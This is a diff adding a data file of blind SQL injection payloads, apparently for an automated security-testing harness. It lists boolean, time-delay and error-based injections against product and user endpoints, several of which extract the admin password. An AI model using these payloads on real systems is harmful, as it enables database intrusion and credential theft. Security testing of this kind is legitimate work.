@@ -1,0 +1,30 @@
+# Blind SQL Injection Payloads
+# Format: method|endpoint|payload|expected_code|attack_id|description
+
+# Boolean-based Blind SQL Injection
+GET|/rest/products/1' AND '1'='1||200|sqli_blind_001|True condition test
+GET|/rest/products/1' AND '1'='2||404|sqli_blind_002|False condition test
+GET|/rest/products/1' AND SUBSTRING(@@version,1,1)='5||200|sqli_blind_003|MySQL version check
+GET|/rest/products/1' AND (SELECT COUNT(*) FROM users)>0 --||200|sqli_blind_004|Table existence check
+GET|/rest/products/1' AND LENGTH(database())>5 --||200|sqli_blind_005|Database name length check
+
+# Time-based Blind SQL Injection
+GET|/rest/products/1' AND SLEEP(5) --||200|sqli_time_001|MySQL sleep 5 seconds
+GET|/rest/products/1' AND BENCHMARK(5000000,MD5('test')) --||200|sqli_time_002|MySQL benchmark delay
+GET|/rest/products/1'; WAITFOR DELAY '00:00:05' --||200|sqli_time_003|MSSQL delay 5 seconds
+GET|/rest/products/1' AND pg_sleep(5) --||200|sqli_time_004|PostgreSQL sleep 5 seconds
+GET|/rest/products/1' AND 1=(CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --||200|sqli_time_005|Conditional time delay
+
+# Content-based Blind Extraction
+GET|/rest/products/1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a||200|sqli_blind_006|Extract first char of password
+GET|/rest/products/1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>65 --||200|sqli_blind_007|ASCII comparison extraction
+GET|/rest/products/1' AND (SELECT COUNT(*) FROM users WHERE password LIKE 'a%')>0 --||200|sqli_blind_008|Password pattern matching
+GET|/rest/products/1' AND EXISTS(SELECT * FROM users WHERE username='admin') --||200|sqli_blind_009|User existence check
+GET|/rest/products/1' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32 --||200|sqli_blind_010|Password length check
+
+# Advanced Blind Techniques
+GET|/rest/products/1' AND IF(1=1,SLEEP(5),0) --||200|sqli_blind_011|MySQL conditional delay
+GET|/rest/products/1' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1) --||200|sqli_blind_012|PostgreSQL conditional
+POST|/api/Users|{"email":"test@test.com' AND (SELECT COUNT(*) FROM users WHERE password REGEXP '^[a-f0-9]{32}$')>0 --","password":"test"}|400|sqli_blind_013|Regex pattern validation
+POST|/api/Users|{"email":"test@test.com' AND MAKE_SET(1|2,@@version,user()) --","password":"test"}|400|sqli_blind_014|MySQL make_set extraction
+POST|/api/Users|{"email":"test@test.com' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --","password":"test"}|400|sqli_blind_015|XML-based extraction
